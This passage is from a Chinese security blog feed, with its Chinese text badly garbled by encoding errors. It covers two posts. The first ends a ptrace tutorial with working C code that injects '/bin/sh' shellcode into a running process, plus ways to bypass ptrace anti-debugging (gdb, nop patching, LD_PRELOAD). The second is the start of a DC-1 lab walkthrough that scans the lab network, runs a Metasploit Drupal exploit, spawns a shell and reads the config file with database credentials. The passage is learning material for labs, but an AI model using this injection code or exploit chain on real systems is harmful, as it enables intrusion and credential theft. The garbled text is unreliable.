unsigned long    ds;</span><br><span class="line">    unsigned long    es;</span><br><span class="line">    unsigned long    fs;</span><br><span class="line">    unsigned long    gs;</span><br><span class="line">&#125;;*&#x2F;</span><br><span class="line">    &#x2F;* int 0x80, int 3 *&#x2F;</span><br><span class="line">    char code[] &#x3D; &#123;0xcd,0x80,0xcc,0&#125;; &#x2F;&#x2F;å®šä¹‰å­—ç¬¦æ•°ç»„ï¼Œå­˜çš„æ˜¯å°†è¦æ’å…¥çš„æœºå™¨ç </span><br><span class="line">    char backup[4]; &#x2F;&#x2F;å®šä¹‰æ¥æ”¶åŸå†…å­˜æœºå™¨ç çš„å­—ç¬¦æ•°ç»„ï¼Œè¿™é‡Œåº”è¯¥å’Œcode[]å­—ç¬¦æ•°é‡ç›¸å¯¹åº”</span><br><span class="line">    traced_process &#x3D; atoi(argv[1]); &#x2F;&#x2F;è¿™é‡ŒæŠŠä¼ å…¥çš„pidè½¬æ¢æˆintç±»å‹</span><br><span class="line">    </span><br><span class="line">    &#x2F;*attackæŒ‡å®špidè¿›ç¨‹ï¼Œtraced_process*&#x2F;</span><br><span class="line">    ptrace(PTRACE_ATTACH, traced_process,NULL, NULL);&#x2F;&#x2F;è·Ÿè¸ªpidè¿›ç¨‹</span><br><span class="line">    wait(NULL); &#x2F;&#x2F;ç­‰å¾…ç³»ç»Ÿé€šçŸ¥</span><br><span class="line">    ptrace(PTRACE_GETREGS, traced_process, NULL, &amp;regs);&#x2F;*è·å–ç›®æ ‡è¿›ç¨‹çš„æ‰€æœ‰å¯„å­˜å™¨å€¼ï¼Œå­˜å…¥regsç»“æ„ä½“å˜é‡ä¸­ï¼Œä¸ºä»¥åæ¢å¤åŸrip,ä»¥åŠå„ä¸ªå¯„å­˜å™¨çš„å€¼åšå‡†å¤‡*&#x2F;</span><br><span class="line">    printf(&quot;eip&#x3D;%lld\n&quot;,regs.rip);</span><br><span class="line">    getdata(traced_process, regs.rip, backup, 3);&#x2F;* å°†ripæŒ‡å‘åœ°å€ä¸­çš„æœºå™¨ç å¤‡ä»½åˆ°backupä¸­*&#x2F;</span><br><span class="line">    putdata(traced_process, regs.rip, code, 3); &#x2F;* å°†int 0x80, int 3æŒ‡ä»¤çš„æœºå™¨ç å†™å…¥ripæŒ‡å‘å†…å­˜åœ°å€ä¸­ï¼Œint 0x80é•¿åº¦ä¸º2ï¼Œint3é•¿åº¦ä¸º1*&#x2F;</span><br><span class="line">    x</span><br><span class="line">    &#x2F;* è®©ç›®æ ‡è¿›ç¨‹ç»§ç»­æ‰§è¡Œå¹¶æ‰§è¡Œæˆ‘ä»¬æ’å…¥çš„int 0x80ï¼Œint 3æŒ‡ä»¤ *&#x2F;</span><br><span class="line">    ptrace(PTRACE_CONT, traced_process, NULL, NULL);</span><br><span class="line">    wait(NULL);&#x2F;&#x2F;ç­‰å¾…ç³»ç»Ÿé€šçŸ¥</span><br><span class="line">    printf(&quot;This process is attacked by 0xAXSDD! Press &lt;enter&gt; to continue!&quot;);</span><br><span class="line">    getchar();&#x2F;&#x2F;æ•è·ä¸€ä¸ª&lt;enter&gt;è¾“å…¥</span><br><span class="line">    putdata(traced_process, regs.rip, backup, 3); &#x2F;*å°†backupåŸæŒ‡ä»¤æœºå™¨ç æ¢å¤åˆ°åŸripæŒ‡å‘çš„åœ°å€ä¸­*&#x2F;</span><br><span class="line">    ptrace(PTRACE_SETREGS, traced_process, NULL, &amp;regs); &#x2F;* è®©ripæŒ‡å‘çš„å†…å­˜åœ°å€æ¢å¤åˆ°åŸæœ¬æŒ‡å‘çš„åœ°å€ï¼Œè®©ç›®æ ‡è¿›ç¨‹ç»§ç»­æ‰§è¡Œï¼Œæ¢å¤ripæŒ‡é’ˆ *&#x2F;</span><br><span class="line">    ptrace(PTRACE_DETACH, traced_process, NULL, NULL);&#x2F;* ç»“æŸè·Ÿè¸ª*&#x2F;</span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æºç ç¼–è¯‘å¦‚æœä½¿ç”¨32ä½ç¼–è¯‘ï¼Œç›¸åº”ripæ”¹æˆeipï¼Œ64ä½ç¼–è¯‘åˆ™ä¸éœ€è¦æ”¹ã€‚<br>æµ‹è¯•ç”¨ä¾‹ï¼Œç”¨ä¸ªç®€å•çš„cè¯­è¨€ç¨‹åºï¼ˆ32ä½ç¼–è¯‘ï¼‰:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;    </span><br><span class="line">    printf(&quot;pid&#x3D;%d\n&quot;,getpid());</span><br><span class="line">    for(int num&#x3D;0;num&lt;20;num++)</span><br><span class="line">    &#123;</span><br><span class="line">    printf(&quot;num &#x3D; %d\n&quot;,num);</span><br><span class="line">    sleep(2);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å½“æˆ‘æ‰§è¡Œhackerç¨‹åºçš„æ—¶å€™ï¼Œhellwordç¨‹åºå°†è¢«æš‚åœï¼ˆè®°å¾—sudoæ‰§è¡Œhackerï¼‰</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/4153844234591.png"></p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/1161212972586.png"></p><p>è¿™é‡Œç›¸å½“äºåŠ«æŒripæŒ‡é’ˆï¼Œè€ŒripæŒ‡é’ˆæŒ‡å‘çš„åœ°å€å°†æ˜¯å³å°†æ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€ã€‚</p><p>ç¨å¾®å˜åŠ¨ä¸€ä¸‹ï¼Œç›´æ¥æ’å…¥ä¸€å°æ®µshellcodeä»£ç ã€‚</p><p>æˆ‘ä»¬å¾—æ˜ç™½æœ‰è¿™å‡ ç§æƒ…å†µï¼š</p><ol><li>æˆ‘ä»¬å¯ä»¥æ’å…¥åˆ°å½“å‰è¦æ‰§è¡Œçš„æŒ‡ä»¤ä¹‹åï¼Œè¿™æ˜¯æœ€ç›´æ¥çš„æ–¹å¼ä½†æ˜¯ä¼šç ´ååŸæœ‰çš„ç›®æ ‡è¿›ç¨‹ï¼Œä¼šå¯¼è‡´åŸæ¥çš„ç›®æ ‡è¿›ç¨‹çš„åç»­åŠŸèƒ½å—åˆ°ç ´åã€‚/<em>ä¸‹é¢å¾—ç¤ºä¾‹å°±ç”¨çš„è¿™ç§æ–¹å¼</em>/</li><li>æˆ‘ä»¬å¯ä»¥å°è¯•æ³¨å…¥ä»£ç åˆ°mainå‡½æ•°åœ°å€å¤„ï¼Œä½†æ˜¯æœ‰ä¸€å®šçš„å‡ ç‡æ˜¯æŸäº›åˆå§‹åŒ–çš„æ“ä½œæ˜¯åœ¨ç¨‹åºæ‰§è¡Œä¹‹å‰ï¼Œå› æ­¤æˆ‘ä»¬é¦–å…ˆéœ€è¦è®©ç¨‹åºçš„æ­£å¸¸å·¥ä½œã€‚</li><li>å¦å¤–çš„é€‰æ‹©æ˜¯ä½¿ç”¨ELFæ³¨å…¥æŠ€å·§ï¼Œæ³¨å…¥æˆ‘ä»¬çš„ä»£ç ï¼Œä¾‹å¦‚åœ¨å†…å­˜ä¸­å¯»æ‰¾ç©ºéš™ã€‚</li><li>æœ€åï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ ˆä¸­æ³¨å…¥ä»£ç ï¼ŒåŒä¸€èˆ¬çš„æ ˆæº¢å‡ºï¼Œè¿™æ˜¯ä¸€ç§å®‰å…¨çš„æ–¹å¼å¯ä»¥é¿å…ç ´ååŸæœ‰ç¨‹åºçš„æ–¹å¼ã€‚</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys&#x2F;ptrace.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;types.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;wait.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys&#x2F;user.h&gt;</span><br><span class="line">#include &lt;asm&#x2F;ptrace-abi.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">const int long_size &#x3D; sizeof(long);</span><br><span class="line">&#x2F;*é€šè¿‡PTRACE_POKEDATAå‘å†…å­˜å†™å†…å®¹*&#x2F;</span><br><span class="line">void putdata(pid_t child, long addr, char *str, int len)</span><br><span class="line">&#123;   </span><br><span class="line">    char *code;</span><br><span class="line">    int i, j;</span><br><span class="line">    union u&#123;</span><br><span class="line">            long val;</span><br><span class="line">            char chars[long_size];</span><br><span class="line">     &#125;data;</span><br><span class="line">    i &#x3D; 0;</span><br><span class="line">    j &#x3D; len &#x2F; long_size;</span><br><span class="line">    code &#x3D; str;</span><br><span class="line">    while(i &lt; j) &#123;</span><br><span class="line">        memcpy(data.chars, code, long_size);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);</span><br><span class="line">        ++i;</span><br><span class="line">        code +&#x3D; long_size;</span><br><span class="line">    &#125;</span><br><span class="line">    j &#x3D; len % long_size;</span><br><span class="line">    if(j !&#x3D; 0) &#123;</span><br><span class="line">        memcpy(data.chars, code, j);</span><br><span class="line">        ptrace(PTRACE_POKEDATA, child, addr + i * 4, data.val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;   pid_t traced_process;</span><br><span class="line">    struct user_regs_struct regs;</span><br><span class="line">    long ins;</span><br><span class="line">    int len &#x3D; 25;</span><br><span class="line">    char insertcode[] &#x3D; &quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&quot;;&#x2F;&#x2F;shellcode</span><br><span class="line">    traced_process &#x3D; atoi(argv[1]);</span><br><span class="line">    ptrace(PTRACE_ATTACH, traced_process,NULL, NULL);&#x2F;&#x2F;è·Ÿè¸ªè¿›ç¨‹</span><br><span class="line">    wait(NULL);</span><br><span class="line">    ptrace(PTRACE_GETREGS, traced_process,NULL, &amp;regs);&#x2F;&#x2F;å½“å‰æ‰€æœ‰å¯„å­˜å™¨çš„å€¼</span><br><span class="line">    putdata(traced_process,regs.eip,insertcode, len);&#x2F;&#x2F;å†™å…¥shellcode</span><br><span class="line">    regs.eip +&#x3D;2 ;&#x2F;&#x2F;ä¿®æ”¹ripçš„å€¼ï¼ŒæŒ‡å‘æˆ‘ä»¬æ³¨å…¥çš„shellcode</span><br><span class="line">    ptrace(PTRACE_SETREGS, traced_process, NULL, &amp;regs);&#x2F;&#x2F;æŠŠä¿®æ”¹åçš„å¯„å­˜å™¨çš„å€¼å†™å…¥è¢«è·Ÿè¸ªçš„è¿›ç¨‹</span><br><span class="line">    ptrace(PTRACE_CONT, traced_process,NULL, NULL);&#x2F;&#x2F;è¢«è·Ÿè¸ªçš„è¿›ç¨‹ç»§ç»­æ‰§è¡Œ</span><br><span class="line">    printf(&quot;This process is attacked by 0xAXSDD! Press &lt;enter&gt; to continue!&quot;);</span><br><span class="line">    ptrace(PTRACE_DETACH, traced_process,NULL, NULL);&#x2F;&#x2F;ç»“æŸè·Ÿè¸ª</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ²¡æœ‰æ¢å¤åˆ°åŸå…ˆæ‰§è¡ŒçŠ¶æ€ï¼Œå› ä¸ºæˆ‘ä»¬ç›´æ¥getshellï¼Œä¸éœ€è¦å†è¿”å›åˆ°åŸç¨‹åºä¸­äº†ã€‚<br>è¿è¡Œæ•ˆæœæˆªå›¾<br><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/4265323362.png"></p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/3628852827.png"></p><h2 id="ç»•è¿‡ç®€å•çš„ptrace"><a href="#ç»•è¿‡ç®€å•çš„ptrace" class="headerlink" title="ç»•è¿‡ç®€å•çš„ptrace"></a>ç»•è¿‡ç®€å•çš„ptrace</h2><p>ä¸Šé¢è°ˆè®ºåˆ°ptraceåœ¨éšè—çš„è¿‡ç¨‹ä¸­çš„æ”»é˜²åšå¼ˆï¼Œå¹¶æ²¡æœ‰è¯´å¦‚ä½•ç»•è¿‡ptraceï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è®²å¦‚ä½•ç»•è¿‡ptraceä¸€äº›æ‰‹æ®µã€‚</p><h3 id="1-é€šè¿‡gdbä¿®æ”¹eaxï¼ˆ64ä½raxï¼‰ä¸­çš„è¿”å›å€¼æ¥ç»•è¿‡ptrace"><a href="#1-é€šè¿‡gdbä¿®æ”¹eaxï¼ˆ64ä½raxï¼‰ä¸­çš„è¿”å›å€¼æ¥ç»•è¿‡ptrace" class="headerlink" title="1.é€šè¿‡gdbä¿®æ”¹eaxï¼ˆ64ä½raxï¼‰ä¸­çš„è¿”å›å€¼æ¥ç»•è¿‡ptrace"></a>1.é€šè¿‡gdbä¿®æ”¹eaxï¼ˆ64ä½raxï¼‰ä¸­çš„è¿”å›å€¼æ¥ç»•è¿‡ptrace</h3><p>ç†è®ºä¾æ®ï¼šåƒè¿™æ ·çš„ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys&#x2F;ptrace.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    if (ptrace(PTRACE_TRACEME, 0, 0, 0) &#x3D;&#x3D;-1 )&#x2F;&#x2F;è¿™é‡Œå°±ç›´æ¥å…ˆæ‰§è¡Œäº†ptrace(PTRACE_TRACEME, 0, 0, 0)ï¼Œè¡¨ç¤ºæ­¤ç¨‹åºå·²ç»è¢«è¿½è¸ª</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;don&#39;t trace meï¼\n&quot;);</span><br><span class="line">        return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;no one trace meï¼\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘è¿™é‡Œç¼–è¯‘ä¸º64ä½<br>é€šè¿‡å‡½æ•°çš„è¿”å›å€¼æ˜¯å¦ä¸º-1æ¥åˆ¤æ–­ï¼Œæ˜¯å¦æ­£åœ¨è¢«è°ƒè¯•ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥ä¿®æ”¹ptraceçš„è¿”å›å€¼ï¼Œå°±å¯ä»¥ç»•è¿‡åˆ¤æ–­ï¼Œptraceå‡½æ•°æ‰§è¡Œä¹‹åçš„è¿”å›å€¼å°†ä¼šä¿å­˜åœ¨raxå¯„å­˜å™¨ä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦åœ¨ptraceå‡½æ•°é‚£é‡Œä¸‹æ–­ç‚¹ï¼Œç„¶åç­‰ptraceå‡½æ•°ç»“æŸåï¼Œåˆ©ç”¨set $rax=0æŒ‡ä»¤æ¥è®¾ç½®raxçš„å€¼ï¼Œé‚£ä¹ˆå°±ä¼šç»•è¿‡åˆ¤æ–­ï¼Œå°±èƒ½ç»§ç»­è°ƒè¯•ç¨‹åºã€‚</p><p>æ¼”ç¤ºï¼š<br>ç›´æ¥sudo gdb hellword3è¿›è¡Œgdbè°ƒè¯•</p><p>ç„¶åè¾“å…¥ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">catch syscall ptrace</span><br></pre></td></tr></table></figure><p>ç„¶åcç»§ç»­æ‰§è¡Œï¼Œç¬¬ä¸€æ¬¡æš‚åœæ˜¯å‘ç”Ÿåœ¨åˆšå¼€å§‹è°ƒç”¨ptraceï¼Œç„¶åç»§ç»­nï¼Œnï¼Œç›´åˆ°è¿”å›åˆ°ä¸»å‡½æ•°ï¼Œæ¯”è¾ƒraxçš„å€¼æ—¶å€™ï¼Œæ³¨æ„ï¼Œæˆ‘ä»¬å¿…é¡»å¾—åœ¨ptraceæ‰§è¡Œå®Œæˆä¹‹åï¼Œè¿”å›åˆ°ä¸»å‡½æ•°æ—¶æ‰æ›´æ”¹raxçš„å€¼</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/153030470666.png"></p><p>å¯ä»¥çœ‹åˆ°æ­£å¸¸ptraceè¿è¡Œå®Œä¹‹åï¼Œraxä¸­çš„å€¼ä¸º-1ï¼ˆ32ä½ä¸ºeaxï¼‰</p><p>è¾“å…¥å‘½ä»¤ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set $rax&#x3D;0</span><br></pre></td></tr></table></figure><p>ç„¶åç»§ç»­è¿è¡Œï¼ŒæˆåŠŸç»•è¿‡ptraceåè°ƒè¯•</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2179340291.png"></p><h3 id="2-ç›´æ¥é€šè¿‡Binary-NinjaæŸ¥æ‰¾ptraceè°ƒç”¨ç„¶ånopæ›¿æ¢"><a href="#2-ç›´æ¥é€šè¿‡Binary-NinjaæŸ¥æ‰¾ptraceè°ƒç”¨ç„¶ånopæ›¿æ¢" class="headerlink" title="2.ç›´æ¥é€šè¿‡Binary NinjaæŸ¥æ‰¾ptraceè°ƒç”¨ç„¶ånopæ›¿æ¢"></a>2.ç›´æ¥é€šè¿‡Binary NinjaæŸ¥æ‰¾ptraceè°ƒç”¨ç„¶ånopæ›¿æ¢</h3><p>ç›´æ¥é€šè¿‡æœç´¢æ–‡æœ¬ï¼Œç„¶åæ‰¾åˆ°è°ƒç”¨ptraceçš„åœ°æ–¹</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/367231987834.png"></p><p>ç›´æ¥é€‰ä¸­è¿™ä¸€è¡Œï¼Œç„¶åå³é”®ï¼Œpatchç„¶åç›´æ¥æ¢æˆnopï¼Œå°±æ¬§å…‹äº†ï¼Œç„¶åå¦å­˜ï¼</p><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/1639554964.png"></p><h3 id="3-ä½¿ç”¨LD-PRELOADæ¥åŠ«æŒptraceå‡½æ•°çš„è°ƒç”¨"><a href="#3-ä½¿ç”¨LD-PRELOADæ¥åŠ«æŒptraceå‡½æ•°çš„è°ƒç”¨" class="headerlink" title="3.ä½¿ç”¨LD_PRELOADæ¥åŠ«æŒptraceå‡½æ•°çš„è°ƒç”¨"></a>3.ä½¿ç”¨LD_PRELOADæ¥åŠ«æŒptraceå‡½æ•°çš„è°ƒç”¨</h3><p>è¿™é‡Œåªé’ˆå¯¹é‚£äº›åŠ¨æ€é“¾æ¥å…±äº«åº“çš„ç¨‹åºï¼Œå±€é™æ€§å¾ˆå¤§ï¼Œé€šè¿‡åˆ›é”®æœ¬åœ°è‡ªå®šä¹‰çš„ä¼ªé€ åº“ï¼Œä½¿ç”¨LD_PRELOADæ¥åŠ«æŒptraceè°ƒç”¨åº“ä¸ºæˆ‘ä»¬è‡ªå®šä¹‰çš„ä¼ªé€ åº“ï¼Œè¿™æ ·å°±èµ·åˆ°äº†ç‹¸çŒ«æ¢å¤ªå­çš„æ•ˆæœï¼</p><p>ç”¨çš„å‘½ä»¤ï¼Œå…±äº«åº“æ–‡ä»¶ä»£ç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">long ptrace(int request, int pid, int addr, int data)</span><br><span class="line">&#123;</span><br><span class="line">     return 0;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ç¼–è¯‘æˆå…±äº«åº“æ–‡ä»¶ï¼Œç„¶åLD_PRELOADåŠ«æŒ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc ptrace.c -o ptrace.so -fPIC -shared -ldl -D_GNU_SOURCE</span><br><span class="line">export LD_PRELOAD&#x3D;&quot;&#x2F;home&#x2F;hacker&#x2F;Reverse_debugging&#x2F;ptrace&#x2F;ptracE.SO&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/MssnHarvey/cloudimg/main/img/3920549679.png"></p><p>å…¶ä»–ç»•è¿‡åè°ƒè¯•æ‰‹æ³•å…·ä½“ç¨‹åºå…·ä½“åˆ†æï¼Œä»¥ä¸€å˜åº”ä¸‡å˜ï¼</p><p>å®Œç»“å®Œç»“ï¼ï¼ï¼æ’’èŠ±æ’’èŠ±</p>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ptrace </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-1é¶æœºæ¸—é€æµ‹è¯•æŠ¥å‘Š</title>
      <link href="2021/03/03/DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/"/>
      <url>2021/03/03/DC-1%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8A%A5%E5%91%8A/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ç«‹ä¸ªflagï¼šä¸€å¤©ä¸€ä¸ªDCæœºï¼ˆæ»‘ç¨½ </p><p>ä¸‹è½½åœ°å€ï¼š<a href="https://harvey.plus/2020/10/28/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/#DC%E9%9D%B6%E6%9C%BA1-9">https://harvey.plus/2020/10/28/%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/#DC%E9%9D%B6%E6%9C%BA1-9</a></p></blockquote><h3 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h3><p>DC-1ï¼ˆnatæ¨¡å¼ï¼‰ï¼›kaliï¼ˆnatæ¨¡å¼ï¼‰<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2023766834.png" alt="img"></p><h3 id="ä¿¡æ¯æœé›†"><a href="#ä¿¡æ¯æœé›†" class="headerlink" title="ä¿¡æ¯æœé›†"></a>ä¿¡æ¯æœé›†</h3><p>æ‰“å¼€DC-1é¡µé¢å¦‚ä¸‹ï¼šï¼ˆæ²¡ç»™è´¦å·å¯†ç éœ€è¦è‡ªå·±æ¸—é€è¿›å»<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/493447337.png" alt="img"><br>é¦–å…ˆæˆ‘ä»¬å¯¹å…¶è¿›è¡Œå†…ç½‘æ‰«æ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/922758081.png" alt="img"><br>è¿™é‡Œæˆ‘ç›´æ¥æµè§ˆå™¨å¯¹å…¶è®¿é—®å‘ç°çš„<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1593893493.png" alt="img"><br>WappalyzeræŸ¥çœ‹å…¶æœåŠ¡ä¿¡æ¯å‘ç°cmsæ˜¯Drupal 7<br><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/384079129.png" alt="img"></p><p>æˆ–è€…ç”¨nmapæ‰«æ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.232.0&#x2F;24</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1783899252.png" alt="img"></p><p>æ¥ç€æ‰«æ³¢ç›®å½•ï¼Œå‘ç°éƒ½æ²¡å•¥åµç”¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http:&#x2F;&#x2F;192.168.232.141&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1526011025.png" alt="img"></p><h3 id="æ¼æ´æ”»å‡»"><a href="#æ¼æ´æ”»å‡»" class="headerlink" title="æ¼æ´æ”»å‡»"></a>æ¼æ´æ”»å‡»</h3><p>msfæœç´¢ç›®æ ‡cmsç‰ˆæœ¬æ¼æ´ï¼Œå®ç°æ¸—é€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search Drupal</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/1406619024.png" alt="img"><br>emmmï¼Œè¿™é‡Œæˆ‘ä»¬å°±ç”¨æœ€æ–°çš„æ¼æ´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use 6</span><br><span class="line">set rhost 192.168.232.141</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2078141204.png" alt="img"></p><p>èŠœæ¹–ï¼Œexitåé€‰æ‹©4ï¼ˆç¬¬äºŒæ–°çš„ï¼‰æˆåŠŸgetshell</p><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/291583468.png"></p><p>åå¼¹å¼çš„shellï¼Œè¿›å…¥äº¤äº’ç•Œé¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;sh&quot;)&#39;</span><br><span class="line"># äº§ç”Ÿä¸€ä¸ªåŸç”Ÿçš„ç»ˆç«¯</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/118672141.png"></p><p>catæŸ¥çœ‹flag1.txtå¾—åˆ°flag1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag1.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/2529118697.png"></p><p>Every good CMS needs a config file =ã€‹ æ¯ä¸ªå¥½çš„CMSéƒ½éœ€è¦ä¸€ä¸ªé…ç½®æ–‡ä»¶<br>äºæ˜¯ä¹æˆ‘ä»¬å»æŸ¥æŸ¥ä»–çš„é…ç½®æ–‡ä»¶å¾—åˆ°flag2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd sites</span><br><span class="line">ls</span><br><span class="line">cd default</span><br><span class="line">ls</span><br><span class="line">cat settings.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/MssnHarvey/cloudimg/img/577679575.png"></p><p>è¿™é‡Œæˆ‘ä»¬æˆåŠŸæ‹¿åˆ°æ•°æ®åº“çš„è´¦å·å¯†ç ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ç™»å½•è¿›æ•°æ®åº“</p><figure 